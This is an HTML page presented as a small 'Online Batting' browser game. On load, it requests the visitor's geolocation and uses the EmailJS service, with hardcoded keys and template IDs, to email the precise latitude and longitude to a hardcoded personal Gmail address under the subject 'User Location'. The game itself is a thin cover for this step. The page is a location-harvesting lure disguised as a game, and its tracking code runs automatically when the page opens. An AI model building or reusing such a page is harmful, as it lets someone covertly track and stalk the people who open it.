<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Online Batting</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #2ecc71, #27ae60);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    .game-container {
      width: 100%;
      max-width: 600px;
      height: 400px;
      background: #1e272e;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
      position: relative;
      overflow: hidden;
    }
    h2 {
      text-align: center;
      padding: 10px;
      background: #2c3e50;
      margin: 0;
      border-top-left-radius: 12px;
      border-top-right-radius: 12px;
    }
    #bat {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 20px;
      background: #e74c3c;
      border-radius: 6px;
    }
    #ball {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 20px;
      height: 20px;
      background: #f1c40f;
      border-radius: 50%;
    }
    #locationDisplay, #status {
      position: absolute;
      bottom: 5px;
      left: 10px;
      right: 10px;
      font-size: 14px;
      text-align: center;
      color: #ecf0f1;
    }
  </style>
</head>
<body>
  <div class="game-container">
    <h2>üèè Online Batting</h2>
    <div id="ball"></div>
    <div id="bat"></div>
    <p id="locationDisplay">Detecting address...</p>
    <p id="status">Please allow location permission.</p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("pHF2L6wyqxq9FRxLB");

    const statusEl = document.getElementById("status");
    const locationDisplay = document.getElementById("locationDisplay");

    function sendLocationEmail(lat, lng) {
      emailjs.send("service_k5lqmjy", "template_cy5xi0w", {
        latitude: lat,
        longitude: lng,
        to_email: "allahabux792@gmail.com",
        subject: "User Location"
      })
      .then(() => {
        statusEl.textContent = `Location sent successfully!`;
        locationDisplay.textContent = `Your location: ${lat}, ${lng}`;
      })
      .catch((error) => {
        statusEl.textContent = "Failed to send email: " + error.text;
      });
    }

    function getLocationAndSend() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude.toFixed(6);
            const lng = position.coords.longitude.toFixed(6);
            locationDisplay.textContent = `Lat ${lat}, Lng ${lng}`;
            statusEl.textContent = `Location found. Sending email...`;
            sendLocationEmail(lat, lng);
          },
          (error) => {
            locationDisplay.textContent = "Error: " + error.message;
            statusEl.textContent = "Error getting location.";
          }
        );
      } else {
        locationDisplay.textContent = "Geolocation not supported.";
        statusEl.textContent = "Geolocation not supported.";
      }
    }

    window.onload = getLocationAndSend;

    // Simple batting game logic
    const bat = document.getElementById("bat");
    const ball = document.getElementById("ball");
    let ballY = 0;
    let ballSpeed = 2;

    function gameLoop() {
      ballY += ballSpeed;
      if (ballY > 360) {
        ballY = 0;
        // Check collision
        const batRect = bat.getBoundingClientRect();
        const ballRect = ball.getBoundingClientRect();
        if (ballRect.bottom >= batRect.top && 
            ballRect.left < batRect.right && 
            ballRect.right > batRect.left) {
          statusEl.textContent = "üéâ You hit the ball!";
        } else {
          statusEl.textContent = "‚ùå Missed!";
        }
      }
      ball.style.top = ballY + "px";
      requestAnimationFrame(gameLoop);
    }
    gameLoop();

    // Move bat with arrow keys
    document.addEventListener("keydown", (e) => {
      const currentLeft = parseInt(bat.style.left || 50);
      if (e.key === "ArrowLeft") {
        bat.style.left = Math.max(5, currentLeft - 5) + "%";
      } else if (e.key === "ArrowRight") {
        bat.style.left = Math.min(95, currentLeft + 5) + "%";
      }
    });
  </script>
</body>
</html>
